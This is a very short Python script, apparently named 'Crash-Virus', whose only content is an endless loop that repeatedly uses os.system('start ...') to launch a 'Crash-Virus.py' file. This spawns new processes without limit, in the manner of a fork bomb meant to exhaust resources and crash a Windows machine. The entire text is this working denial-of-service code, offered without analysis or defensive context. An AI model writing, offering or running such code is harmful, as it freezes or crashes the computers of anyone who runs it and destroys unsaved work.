import os
# 主程式-------------------------------------------------------->
while 0==0:
 	os.system("start .新增資料夾/Crash-Virus/Crash-Virus.py")